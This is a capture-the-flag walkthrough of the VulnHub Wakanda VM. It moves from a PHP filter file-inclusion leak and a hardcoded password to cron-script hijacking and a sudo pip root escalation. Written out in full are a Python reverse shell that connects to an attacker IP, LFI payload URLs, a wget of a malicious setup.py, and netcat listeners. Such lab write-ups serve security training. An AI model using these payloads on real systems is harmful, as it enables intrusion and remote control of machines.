# Wakanda CTF - Complete Walkthrough

## Overview

**VM Name:**  Wakanda
**Source:** [VulnHub](https://www.vulnhub.com/entry/wakanda-1,251/)  
**Difficulty:** Intermediate  
**Objective:** Capture three flags hidden throughout the system

This CTF challenges participants to exploit web vulnerabilities, abuse cron jobs, and leverage sudo misconfigurations to achieve complete system compromise.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Application Analysis](#2-web-application-analysis)
3. [Credential Discovery](#3-credential-discovery)
4. [Initial Access](#4-initial-access)
5. [Lateral Movement](#5-lateral-movement)
6. [Privilege Escalation](#6-privilege-escalation)
7. [Flags](#7-flags)

---

## 1. Reconnaissance

### Network Scanning

Initial network discovery using Nmap:

```bash
nmap -sC -sV -p- 10.0.2.12
```

**Key Findings:**

| Port | State | Service |
|------|-------|---------|
| 80   | Open  | HTTP    |
| 111  | Open  | RPCBIND |
| 3333 | Open  | SSH     |

**Target IP:** `10.0.2.12`

The SSH service running on the non-standard port 3333 is unusual and warrants consideration for potential exploitation later on.

---

## 2. Web Application Analysis

### Initial Web Enumeration

Browsing to `http://10.0.2.12/` revealed a standard webpage. Inspecting the source code uncovered an interesting commented-out line:

```html
<!-- <a class="nav-link active" href="?lang=fr">Fr</a> -->
```

The `?lang=fr` parameter suggests potential Local File Inclusion (LFI) vulnerability.

### LFI Testing

Testing the parameter:

```
http://10.0.2.12/?lang=fr
```

The page loaded successfully, confirming the parameter is functional. Next step: attempt to read server files using PHP filters.

### PHP Filter Exploitation

```
http://10.0.2.12/?lang=php://filter/read=string.rot13/resource=index.php
http://10.0.2.12/?lang=php://filter/convert.base64-encode/resource=index.php
```

The base64 encoding filter worked but required case manipulation to bypass restrictions:

```
http://10.0.2.12/?lang=pHp://FilTer/convert.base64-encode/resource=index
```

**Result:** Server returned a large base64-encoded string containing the source code.

### Source Code Analysis

Decoded the base64 output:

```bash
echo "<base64_output>" > base64.txt
base64 -d base64.txt
```

**Critical Finding in Source Code:**

```php
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
    include($_GET['lang'].".php");
}
?>
```

Hardcoded credentials discovered in the source code.

---

## 3. Credential Discovery

### Credentials Found

- **Password:** `Niamey4Ever227!!!`
- **Potential Users:** `mamadou`, `root`

The password comment suggests it's meant to be remembered, indicating it's likely used for authentication.

---

## 4. Initial Access

### SSH Authentication

Attempted SSH connection with discovered credentials:

```bash
ssh mamadou@10.0.2.12 -p 3333
Password: Niamey4Ever227!!!
```

**Unexpected Behavior:** Instead of a standard bash shell, the SSH session opened a Python interactive shell:

```python
>>> whoami
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'whoami' is not defined
```

### Shell Upgrade

The restricted Python shell required upgrading to a proper bash environment:

```python
>>> import pty; pty.spawn("/bin/bash")
mamadou@Wakanda1:~$
```

Successfully obtained an interactive bash shell as user `mamadou`.

### First Flag

```bash
mamadou@Wakanda1:~$ pwd
/home/mamadou

mamadou@Wakanda1:~$ ls -l
total 4
-rw-r--r-- 1 mamadou mamadou 41 Aug  1  2018 flag1.txt

mamadou@Wakanda1:~$ cat flag1.txt
Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
```

**Flag 1 obtained:** `d86b9ad71ca887f4dd1dac86ba1c4dfc`

---

## 5. Lateral Movement

### Privilege Enumeration

```bash
mamadou@Wakanda1:~$ sudo -l
[sudo] password for mamadou: 
Sorry, user mamadou may not run sudo on Wakanda1.
```

User `mamadou` has no sudo privileges. Need alternative escalation path.

### Locating Second Flag

```bash
mamadou@Wakanda1:~$ locate flag2.txt
/home/devops/flag2.txt

mamadou@Wakanda1:~$ ls -la /home/devops/
total 12
drwxr-xr-x 2 devops devops 4096 Aug  1  2018 .
drwxr-xr-x 4 root   root   4096 Aug  1  2018 ..
-r-------- 1 devops devops   41 Aug  1  2018 flag2.txt
```

Flag 2 is owned by the `devops` user and not readable by `mamadou`.

### File System Enumeration

Searched for files owned by the `devops` user:

```bash
mamadou@Wakanda1:~$ find / -user devops 2>/dev/null
/srv/.antivirus.py
/tmp/test
/home/devops
/home/devops/.bashrc
/home/devops/.profile
/home/devops/.bash_logout
/home/devops/flag2.txt
```

**Critical Discovery:** `/srv/.antivirus.py`

### Analyzing the Antivirus Script

```bash
mamadou@Wakanda1:~$ cat /tmp/test
test

mamadou@Wakanda1:~$ cat /srv/.antivirus.py
open('/tmp/test', 'w').write('test')
```

The script writes to `/tmp/test`, which is world-writable. The script appears to be executed periodically by a cron job running as the `devops` user.

### Exploiting Cron Job for Flag Retrieval

Modified the antivirus script to read flag2.txt:

```bash
mamadou@Wakanda1:~$ echo "open('/tmp/test', 'w').write(open('/home/devops/flag2.txt').read())" > /srv/.antivirus.py
```

Waited for the cron job to execute, then:

```bash
mamadou@Wakanda1:~$ cat /tmp/test
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
```

**Flag 2 obtained:** `d8ce56398c88e1b4d9e5f83e64c79098`

### Gaining Devops Shell

To achieve full access as `devops`, deployed a reverse shell through the same cron job mechanism.

**Attacker Machine:**

```bash
nc -nvlp 1234
listening on [any] 1234 ...
```

**Target Machine:**

```bash
mamadou@Wakanda1:~$ cat > /srv/.antivirus.py << 'EOF'
import os 
import socket
import subprocess

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.6", 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p=subprocess.call(["/bin/sh", "-i"])
EOF
```

**Connection Received:**

```bash
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.12] 33886
/bin/sh: 0: can't access tty; job control turned off

$ whoami
devops
```

Successfully obtained shell as `devops` user.

---

## 6. Privilege Escalation

### Sudo Enumeration

```bash
$ sudo -l
User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```

**Critical Finding:** The `devops` user can execute `/usr/bin/pip` as root without a password.

### Exploiting Sudo Pip

This is a known privilege escalation vector. Created a malicious Python package using the FakePip technique.

**Reference:** [FakePip GitHub Repository](https://github.com/0x00-0x00/FakePip)

**Attacker Machine - Setup HTTP Server:**

```bash
python3 -m http.server --bind 10.0.2.6
Serving HTTP on 10.0.2.6 port 8000 ...
```

**Attacker Machine - Setup Listener:**

```bash
nc -nvlp 13372
listening on [any] 13372 ...
```

**Target Machine - Download and Install Malicious Package:**

```bash
$ wget http://10.0.2.6:8000/setup.py
$ ls
setup.py
flag2.txt

$ sudo /usr/bin/pip install . --upgrade --force-reinstall
```

**Root Shell Obtained:**

```bash
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.12] 45821

# whoami
root
```

### Root Flag

```bash
# cd /root
# ls -la
total 28
drwx------  3 root root 4096 Aug  1  2018 .
drwxr-xr-x 22 root root 4096 Aug  1  2018 ..
-rw-r--r--  1 root root  305 Aug  1  2018 root.txt

# cat root.txt

 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc
```

**Flag 3 obtained:** `821ae63dbe0c573eff8b69d451fb21bc`

---

## 7. Flags

| Flag | Location | Value |
|------|----------|-------|
| Flag 1 | `/home/mamadou/flag1.txt` | `d86b9ad71ca887f4dd1dac86ba1c4dfc` |
| Flag 2 | `/home/devops/flag2.txt` | `d8ce56398c88e1b4d9e5f83e64c79098` |
| Flag 3 | `/root/root.txt` | `821ae63dbe0c573eff8b69d451fb21bc` |

---

## Key Takeaways

### Vulnerabilities Exploited

1. **Local File Inclusion (LFI)** - PHP filter abuse allowed source code disclosure
2. **Hardcoded Credentials** - Password found in application source code
3. **Restricted Shell Misconfiguration** - Python shell allowed easy escape to bash
4. **Insecure Cron Jobs** - World-writable script executed as privileged user
5. **Sudo Misconfiguration** - Pip binary allowed with NOPASSWD privilege

### Attack Chain Summary

```
LFI Vulnerability (/?lang parameter)
    ↓
PHP Filter Base64 Encoding
    ↓
Source Code Disclosure
    ↓
Hardcoded Password Discovery (Niamey4Ever227!!!)
    ↓
SSH Access (Python Shell)
    ↓
Shell Upgrade (PTY Spawn)
    ↓
Flag 1 Capture
    ↓
Cron Job Discovery (/srv/.antivirus.py)
    ↓
Flag 2 Extraction (via cron abuse)
    ↓
Reverse Shell (devops user)
    ↓
Sudo Pip Discovery (NOPASSWD)
    ↓
Privilege Escalation (FakePip)
    ↓
Root Access & Flag 3 Capture
```

### Security Recommendations

- Never hardcode credentials in application source files
- Implement proper input validation to prevent LFI vulnerabilities
- Restrict file permissions on cron job scripts
- Audit sudo configurations - avoid NOPASSWD for package managers
- Use restricted shells properly or disable them entirely
- Regular security audits of file permissions and scheduled tasks
- Implement proper access controls on web application parameters

---

## Tools Used

- **Nmap** - Network scanning and service enumeration
- **curl** - HTTP requests and file retrieval
- **base64** - Decoding encoded content
- **SSH** - Remote access
- **Python PTY** - Shell stabilization
- **Netcat** - Reverse shell listener
- **FakePip** - Pip privilege escalation exploit

---

## References

- VulnHub: https://www.vulnhub.com/entry/wakanda-1,251/
- FakePip: https://github.com/0x00-0x00/FakePip
- HackTricks LFI: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/
- GTFOBins Pip: https://gtfobins.github.io/gtfobins/pip/

---

## Author

**0xCr0nu5**  
Connect with me: [GitHub](https://github.com/0xCr0nu5)

---

*Disclaimer: This writeup is for educational purposes only. Always obtain proper authorization before testing security on any system.*
